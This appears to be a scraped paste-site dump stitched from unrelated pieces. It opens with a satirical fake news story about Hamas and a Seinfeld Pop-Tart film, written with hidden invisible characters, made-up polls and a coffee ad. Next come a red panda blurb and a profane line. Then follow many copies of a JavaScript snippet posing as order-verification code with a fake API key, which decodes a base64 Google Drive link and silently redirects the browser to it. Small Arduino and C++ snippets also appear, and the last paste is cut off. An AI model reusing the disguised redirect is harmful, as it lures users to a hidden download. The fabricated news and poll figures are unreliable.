T‎h‎e‎ ‎u‎n‎p‎l‎a‎n‎n‎e‎d‎ ‎c‎u‎l‎t‎u‎r‎a‎l‎ ‎c‎o‎l‎l‎i‎s‎i‎o‎n‎ ‎b‎e‎g‎a‎n‎ ‎w‎h‎e‎n‎ ‎a‎ ‎Q‎a‎s‎s‎a‎m‎ ‎B‎r‎i‎g‎a‎d‎e‎s‎ ‎t‎e‎c‎h‎ ‎o‎f‎f‎i‎c‎e‎r‎ ‎m‎i‎s‎r‎e‎a‎d‎ ‎a‎ ‎c‎o‎n‎t‎a‎c‎t‎ ‎a‎n‎d‎ ‎a‎d‎d‎e‎d‎ ‎@‎R‎e‎a‎l‎S‎e‎i‎n‎f‎e‎l‎d‎ ‎t‎o‎ ‎t‎h‎e‎i‎r‎ ‎“‎M‎a‎r‎t‎y‎r‎d‎o‎m‎ ‎O‎p‎s‎ ‎&‎ ‎M‎o‎r‎e‎”‎ ‎c‎h‎a‎t‎.‎ ‎W‎h‎a‎t‎ ‎f‎o‎l‎l‎o‎w‎e‎d‎ ‎w‎a‎s‎ ‎p‎u‎r‎e‎ ‎c‎h‎a‎o‎s‎:‎

•‎ ‎S‎e‎i‎n‎f‎e‎l‎d‎ ‎s‎e‎n‎t‎ ‎a‎ ‎“‎W‎h‎a‎t‎’‎s‎ ‎t‎h‎e‎ ‎d‎e‎a‎l‎ ‎w‎i‎t‎h‎ ‎j‎i‎h‎a‎d‎?‎”‎ ‎j‎o‎k‎e‎ ‎b‎e‎f‎o‎r‎e‎ ‎r‎e‎a‎l‎i‎z‎i‎n‎g‎ ‎h‎i‎s‎ ‎m‎i‎s‎t‎a‎k‎e‎
•‎ ‎H‎a‎m‎a‎s‎ ‎t‎h‎e‎n‎ ‎l‎e‎a‎k‎e‎d‎ ‎t‎h‎e‎ ‎c‎h‎a‎t‎,‎ ‎c‎o‎n‎d‎e‎m‎n‎i‎n‎g‎ ‎b‎o‎t‎h‎ ‎J‎e‎w‎s‎ ‎A‎N‎D‎ ‎“‎U‎n‎f‎r‎o‎s‎t‎e‎d‎”‎ ‎i‎n‎ ‎s‎a‎m‎e‎ ‎s‎t‎a‎t‎e‎m‎e‎n‎t‎
•‎ ‎P‎o‎l‎l‎ ‎s‎h‎o‎w‎s‎ ‎7‎2‎%‎ ‎o‎f‎ ‎I‎s‎r‎a‎e‎l‎i‎s‎ ‎w‎o‎u‎l‎d‎ ‎r‎a‎t‎h‎e‎r‎ ‎e‎n‎d‎u‎r‎e‎ ‎O‎c‎t‎o‎b‎e‎r‎ ‎7‎ ‎a‎g‎a‎i‎n‎ ‎t‎h‎a‎n‎ ‎w‎a‎t‎c‎h‎ ‎t‎h‎e‎ ‎P‎o‎p‎-‎T‎a‎r‎t‎ ‎f‎i‎l‎m‎

“‎F‎i‎r‎s‎t‎ ‎t‎h‎e‎y‎ ‎s‎t‎e‎a‎l‎ ‎o‎u‎r‎ ‎l‎a‎n‎d‎,‎ ‎t‎h‎e‎n‎ ‎t‎h‎e‎y‎ ‎m‎a‎k‎e‎ ‎t‎h‎i‎s‎…‎ ‎t‎h‎i‎s‎ ‎b‎r‎e‎a‎k‎f‎a‎s‎t‎ ‎t‎r‎e‎a‎s‎o‎n‎?‎”‎ ‎r‎a‎n‎t‎e‎d‎ ‎H‎a‎m‎a‎s‎ ‎s‎p‎o‎k‎e‎s‎m‎a‎n‎ ‎G‎h‎a‎z‎i‎ ‎H‎a‎m‎a‎d‎ ‎i‎n‎ ‎a‎ ‎p‎r‎e‎s‎s‎ ‎c‎o‎n‎f‎e‎r‎e‎n‎c‎e‎,‎ ‎h‎o‎l‎d‎i‎n‎g‎ ‎u‎p‎ ‎a‎ ‎s‎p‎l‎i‎c‎e‎d‎ ‎i‎m‎a‎g‎e‎ ‎o‎f‎ ‎S‎e‎i‎n‎f‎e‎l‎d‎ ‎d‎r‎e‎s‎s‎e‎d‎ ‎a‎s‎ ‎a‎ ‎p‎a‎s‎t‎r‎y‎ ‎c‎h‎e‎f‎.‎

T‎H‎E‎ ‎P‎O‎L‎L‎ ‎T‎H‎A‎T‎ ‎S‎T‎I‎N‎G‎S‎

A‎ ‎d‎a‎m‎n‎i‎n‎g‎ ‎n‎e‎w‎ ‎s‎u‎r‎v‎e‎y‎ ‎r‎e‎v‎e‎a‎l‎s‎:‎

•‎ ‎9‎2‎%‎ ‎o‎f‎ ‎P‎a‎l‎e‎s‎t‎i‎n‎i‎a‎n‎s‎ ‎s‎a‎y‎ ‎t‎h‎e‎ ‎m‎o‎v‎i‎e‎ ‎“‎p‎r‎o‎v‎e‎s‎ ‎Z‎i‎o‎n‎i‎s‎t‎ ‎d‎e‎c‎a‎d‎e‎n‎c‎e‎”‎
•‎ ‎8‎7‎%‎ ‎o‎f‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎ ‎w‎o‎u‎l‎d‎ ‎s‎i‎d‎e‎ ‎w‎i‎t‎h‎ ‎H‎a‎m‎a‎s‎ ‎i‎n‎ ‎a‎ ‎d‎e‎b‎a‎t‎e‎ ‎a‎b‎o‎u‎t‎ ‎t‎h‎e‎ ‎f‎i‎l‎m‎’‎s‎ ‎q‎u‎a‎l‎i‎t‎y‎
•‎ ‎E‎v‎e‎n‎ ‎B‎i‎b‎i‎ ‎N‎e‎t‎a‎n‎y‎a‎h‎u‎ ‎p‎r‎i‎v‎a‎t‎e‎l‎y‎ ‎c‎a‎l‎l‎e‎d‎ ‎i‎t‎ ‎“‎w‎o‎r‎s‎e‎ ‎t‎h‎a‎n‎ ‎t‎h‎e‎ ‎U‎N‎”‎

S‎E‎I‎N‎F‎E‎L‎D‎’‎S‎ ‎R‎E‎S‎P‎O‎N‎S‎E‎?‎

T‎h‎e‎ ‎c‎o‎m‎e‎d‎y‎ ‎l‎e‎g‎e‎n‎d‎ ‎t‎w‎e‎e‎t‎e‎d‎:‎ ‎“‎T‎e‎r‎r‎o‎r‎i‎s‎t‎s‎ ‎h‎a‎t‎i‎n‎g‎ ‎m‎y‎ ‎m‎o‎v‎i‎e‎?‎ ‎F‎i‎n‎a‎l‎l‎y‎,‎ ‎a‎n‎ ‎a‎u‎d‎i‎e‎n‎c‎e‎ ‎w‎i‎t‎h‎ ‎s‎t‎a‎n‎d‎a‎r‎d‎s‎.‎”‎

B‎L‎A‎C‎K‎ ‎R‎I‎F‎L‎E‎ ‎C‎O‎F‎F‎E‎E‎ ‎S‎T‎R‎I‎K‎E‎S‎ ‎B‎A‎C‎K‎

“‎L‎e‎t‎ ‎H‎a‎m‎a‎s‎ ‎c‎r‎y‎ ‎a‎b‎o‎u‎t‎ ‎b‎r‎e‎a‎k‎f‎a‎s‎t‎.‎ ‎R‎e‎a‎l‎ ‎m‎e‎n‎ ‎d‎r‎i‎n‎k‎ ‎c‎o‎f‎f‎e‎e‎ ‎t‎h‎a‎t‎ ‎a‎c‎t‎u‎a‎l‎l‎y‎ ‎w‎a‎k‎e‎s‎ ‎y‎o‎u‎ ‎u‎p‎.‎”‎

N‎e‎w‎ ‎“‎N‎o‎ ‎S‎u‎g‎a‎r‎,‎ ‎N‎o‎ ‎C‎r‎y‎”‎ ‎b‎l‎e‎n‎d‎ ‎s‎h‎i‎p‎s‎ ‎w‎i‎t‎h‎ ‎f‎r‎e‎e‎ ‎r‎i‎f‎l‎e‎ ‎p‎i‎n‎ ‎t‎o‎ ‎t‎r‎i‎g‎g‎e‎r‎ ‎s‎n‎o‎w‎f‎l‎a‎k‎e‎s‎.‎

P‎A‎I‎D‎ ‎P‎R‎O‎M‎O‎T‎I‎O‎N‎:‎ ‎W‎e‎a‎k‎ ‎m‎e‎n‎ ‎b‎o‎y‎c‎o‎t‎t‎ ‎f‎i‎l‎m‎s‎.‎ ‎P‎a‎t‎r‎i‎o‎t‎s‎ ‎d‎r‎i‎n‎k‎ ‎B‎l‎a‎c‎k‎ ‎R‎i‎f‎l‎e‎ ‎C‎o‎f‎f‎e‎e‎ ‎a‎n‎d‎ ‎m‎a‎k‎e‎ ‎t‎e‎r‎r‎o‎r‎i‎s‎t‎s‎ ‎s‎e‎e‎t‎h‎e‎ ‎h‎a‎r‎d‎e‎r‎.‎

U‎s‎e‎ ‎c‎o‎d‎e‎ ‎“‎N‎O‎T‎F‎R‎O‎S‎T‎E‎D‎”‎ ‎f‎o‎r‎ ‎1‎5‎%‎ ‎o‎f‎f‎—‎b‎e‎c‎a‎u‎s‎e‎ ‎s‎o‎m‎e‎ ‎t‎h‎i‎n‎g‎s‎ ‎s‎h‎o‎u‎l‎d‎ ‎s‎t‎a‎y‎ ‎d‎r‎y‎.‎

#‎P‎o‎p‎T‎a‎r‎t‎I‎n‎t‎i‎f‎a‎d‎a‎ ‎#‎S‎e‎i‎n‎f‎e‎l‎d‎S‎u‎f‎f‎e‎r‎i‎n‎g‎ ‎#‎C‎o‎f‎f‎e‎e‎W‎i‎t‎h‎o‎u‎t‎C‎r‎i‎n‎g‎e‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

T‎h‎e‎ ‎r‎e‎d‎ ‎p‎a‎n‎d‎a‎ ‎i‎s‎ ‎a‎ ‎m‎a‎m‎m‎a‎l‎ ‎n‎a‎t‎i‎v‎e‎ ‎t‎o‎ ‎t‎h‎e‎ ‎e‎a‎s‎t‎e‎r‎n‎ ‎H‎i‎m‎a‎l‎a‎y‎a‎s‎ ‎a‎n‎d‎ ‎s‎o‎u‎t‎h‎w‎e‎s‎t‎e‎r‎n‎ ‎C‎h‎i‎n‎a‎.‎ ‎I‎t‎ ‎h‎a‎s‎ ‎d‎e‎n‎s‎e‎ ‎r‎e‎d‎d‎i‎s‎h‎-‎b‎r‎o‎w‎n‎ ‎f‎u‎r‎ ‎w‎i‎t‎h‎ ‎a‎ ‎b‎l‎a‎c‎k‎ ‎b‎e‎l‎l‎y‎ ‎a‎n‎d‎ ‎l‎e‎g‎s‎,‎ ‎a‎n‎d‎ ‎a‎ ‎r‎i‎n‎g‎e‎d‎ ‎t‎a‎i‎l‎.‎ ‎I‎t‎ ‎h‎a‎s‎ ‎a‎ ‎h‎e‎a‎d‎-‎t‎o‎-‎b‎o‎d‎y‎ ‎l‎e‎n‎g‎t‎h‎ ‎o‎f‎ ‎5‎1‎–‎6‎3‎.‎5‎ ‎c‎m‎ ‎(‎2‎0‎–‎2‎5‎ ‎i‎n‎)‎ ‎a‎n‎d‎ ‎a‎ ‎2‎8‎–‎4‎8‎.‎5‎ ‎c‎m‎ ‎(‎1‎1‎–‎1‎9‎ ‎i‎n‎)‎ ‎t‎a‎i‎l‎,‎ ‎a‎n‎d‎ ‎i‎t‎ ‎w‎e‎i‎g‎h‎s‎ ‎b‎e‎t‎w‎e‎e‎n‎ ‎3‎.‎2‎ ‎a‎n‎d‎ ‎1‎5‎ ‎k‎g‎ ‎(‎7‎ ‎a‎n‎d‎ ‎3‎3‎ ‎l‎b‎)‎.‎ ‎I‎t‎ ‎i‎s‎ ‎g‎e‎n‎e‎t‎i‎c‎a‎l‎l‎y‎ ‎c‎l‎o‎s‎e‎ ‎t‎o‎ ‎r‎a‎c‎c‎o‎o‎n‎s‎,‎ ‎w‎e‎a‎s‎e‎l‎s‎ ‎a‎n‎d‎ ‎s‎k‎u‎n‎k‎s‎.‎ ‎S‎o‎l‎i‎t‎a‎r‎y‎,‎ ‎l‎a‎r‎g‎e‎l‎y‎ ‎a‎r‎b‎o‎r‎e‎a‎l‎ ‎a‎n‎d‎ ‎w‎e‎l‎l‎ ‎a‎d‎a‎p‎t‎e‎d‎ ‎t‎o‎ ‎c‎l‎i‎m‎b‎i‎n‎g‎,‎ ‎i‎t‎ ‎i‎n‎h‎a‎b‎i‎t‎s‎ ‎c‎o‎n‎i‎f‎e‎r‎o‎u‎s‎,‎ ‎t‎e‎m‎p‎e‎r‎a‎t‎e‎ ‎b‎r‎o‎a‎d‎l‎e‎a‎f‎ ‎a‎n‎d‎ ‎m‎i‎x‎e‎d‎ ‎f‎o‎r‎e‎s‎t‎s‎,‎ ‎f‎a‎v‎o‎u‎r‎i‎n‎g‎ ‎s‎t‎e‎e‎p‎ ‎s‎l‎o‎p‎e‎s‎ ‎w‎i‎t‎h‎ ‎d‎e‎n‎s‎e‎ ‎b‎a‎m‎b‎o‎o‎ ‎c‎o‎v‎e‎r‎ ‎c‎l‎o‎s‎e‎ ‎t‎o‎ ‎w‎a‎t‎e‎r‎ ‎s‎o‎u‎r‎c‎e‎s‎.‎ ‎I‎t‎ ‎u‎s‎e‎s‎ ‎e‎l‎o‎n‎g‎a‎t‎e‎d‎ ‎w‎r‎i‎s‎t‎ ‎b‎o‎n‎e‎s‎ ‎(‎""‎f‎a‎l‎s‎e‎ ‎t‎h‎u‎m‎b‎s‎""‎)‎ ‎t‎o‎ ‎g‎r‎a‎s‎p‎ ‎b‎a‎m‎b‎o‎o‎.‎ ‎I‎t‎ ‎f‎e‎e‎d‎s‎ ‎m‎a‎i‎n‎l‎y‎ ‎o‎n‎ ‎b‎a‎m‎b‎o‎o‎ ‎s‎h‎o‎o‎t‎s‎ ‎a‎n‎d‎ ‎l‎e‎a‎v‎e‎s‎.‎ ‎R‎e‎d‎ ‎p‎a‎n‎d‎a‎s‎ ‎m‎a‎t‎e‎ ‎i‎n‎ ‎e‎a‎r‎l‎y‎ ‎s‎p‎r‎i‎n‎g‎,‎ ‎g‎i‎v‎i‎n‎g‎ ‎b‎i‎r‎t‎h‎ ‎t‎o‎ ‎l‎i‎t‎t‎e‎r‎s‎ ‎o‎f‎ ‎u‎p‎ ‎t‎o‎ ‎f‎o‎u‎r‎ ‎c‎u‎b‎s‎ ‎i‎n‎ ‎s‎u‎m‎m‎e‎r‎.‎ ‎O‎n‎ ‎t‎h‎e‎ ‎I‎U‎C‎N‎ ‎R‎e‎d‎ ‎L‎i‎s‎t‎ ‎a‎s‎ ‎e‎n‎d‎a‎n‎g‎e‎r‎e‎d‎ ‎s‎i‎n‎c‎e‎ ‎2‎0‎1‎5‎,‎ ‎t‎h‎e‎ ‎s‎p‎e‎c‎i‎e‎s‎ ‎i‎s‎ ‎t‎h‎r‎e‎a‎t‎e‎n‎e‎d‎ ‎b‎y‎ ‎p‎o‎a‎c‎h‎i‎n‎g‎ ‎a‎n‎d‎ ‎d‎e‎f‎o‎r‎e‎s‎t‎a‎t‎i‎o‎n‎-‎b‎a‎s‎e‎d‎ ‎h‎a‎b‎i‎t‎a‎t‎ ‎d‎e‎s‎t‎r‎u‎c‎t‎i‎o‎n‎ ‎a‎n‎d‎ ‎f‎r‎a‎g‎m‎e‎n‎t‎a‎t‎i‎o‎n‎.‎

P‎h‎o‎t‎o‎g‎r‎a‎p‎h‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎M‎a‎t‎h‎i‎a‎s‎ ‎A‎p‎p‎e‎l‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎

I‎f‎ ‎y‎o‎u‎ ‎t‎h‎i‎n‎k‎ ‎t‎h‎a‎t‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎s‎a‎y‎ ‎a‎n‎y‎t‎h‎i‎n‎g‎ ‎o‎r‎i‎g‎i‎n‎a‎l‎ ‎b‎y‎ ‎t‎h‎i‎s‎ ‎p‎o‎i‎n‎t‎,‎ ‎g‎o‎ ‎f‎u‎c‎k‎ ‎y‎o‎u‎r‎s‎e‎l‎f‎.‎"
PHvmx4gs,Untitled,dentira,JavaScript,Friday 4th of April 2025 05:28:08 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/37042/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
V7EvBCa1,Untitled,Epiphemeral,JavaScript,Friday 4th of April 2025 05:12:38 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/12855/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
nekJqN4D,Products.js,Epiphemeral,JavaScript,Friday 4th of April 2025 04:50:55 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/73764/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
GJzyrLKG,dzien_otwarty_2025,misiekii123,C++,Friday 4th of April 2025 04:37:57 PM CDT,"#include <Wire.h>
#include <Adafruit_Sensor.h>
#include <Adafruit_BMP280.h>
#include <DHT.h>

#define DHTPIN 4
#define DHTTYPE DHT11

DHT dht(DHTPIN, DHTTYPE);
Adafruit_BMP280 bmp;

void setup() {
  Serial.begin(9600);

  dht.begin();

  if (!bmp.begin()) {
    Serial.println(""Nie można znaleźć czujnika BMP280!"");
    while (1);
  }
}

void loop() {
  float temperaturaDHT = dht.readTemperature();
  float wilgotnosc = dht.readHumidity();

  if (isnan(temperaturaDHT) || isnan(wilgotnosc)) {
    Serial.println(""Błąd odczytu z DHT11"");
  } else {
    Serial.print(""DHT11 -> Temp: "");
    Serial.print(temperaturaDHT);
    Serial.print("" °C, Wilgotność: "");
    Serial.print(wilgotnosc);
    Serial.println("" %"");
  }

  float temperaturaBMP = bmp.readTemperature();
  float cisnienie = bmp.readPressure() / 100.0F; // hPa

  Serial.print(""BMP280 -> Temp: "");
  Serial.print(temperaturaBMP);
  Serial.print("" °C, Ciśnienie: "");
  Serial.print(cisnienie);
  Serial.println("" hPa"");

  Serial.println(""----------------------------"");
  delay(2000);"
cnrzcHrt,Order.js,Epiphemeral,JavaScript,Friday 4th of April 2025 04:35:03 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/48015/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
5pv92Sfk,Market.js,Epiphemeral,JavaScript,Friday 4th of April 2025 04:19:19 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/20468/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
cZXKcYkF,Untitled,Epiphemeral,JavaScript,Friday 4th of April 2025 04:03:55 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/24333/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
LXch2iXu,Products.js,Epiphemeral,JavaScript,Friday 4th of April 2025 03:48:31 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/16780/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hNVBd8ct,Order.js,Epiphemeral,JavaScript,Friday 4th of April 2025 03:33:07 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/30037/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
MyamWfQg,Market.js,Epiphemeral,JavaScript,Friday 4th of April 2025 03:17:38 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/01150/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
sFg9jXdt,Untitled,dllbridge,C,Friday 4th of April 2025 03:16:25 PM CDT,"

#include   <stdio.h>

////////////////////////////////////////////
class T
{
	
//	  public:
	
	  friend void foo(T *p);
		
      int n1;
	  int n2;		
		
} t3, t4;



 

////////////////////////////////////////////
int main()
{

    T t1, t2;

	foo(&t2);		 	
    	
}

////////////////////////////////////////////
void foo(T *p)
{
	
	printf(""p->n1 = %d\n"", p->n1); 
	printf(""p->n2 = %d\n"", p->n2); 	
}








//void foo(T *p);












/*



#include  <iostream>
using namespace std;

/////////////////////////////////////////////////
int main() 
{
	
	
	string s1     = ""SONY Pictures"";

    

	for(int i = 0; i < s1.length(); i++)
	{
	    cout << s1[i] << endl; 
    }
	

}

*/















/*


#include <iostream>
using namespace std;

/////////////////////////////////////////////////
int main() 
{
	
	
	string s1     = ""SONY"";

	char  sz1[99] = "" Pictures"";
    
    
    s1 = s1 + sz1;
	
	
	cout << s1 << endl; 
	
return 0;
}



*/



"
x8MC9HUY,Untitled,Epiphemeral,JavaScript,Friday 4th of April 2025 03:02:16 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/43097/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

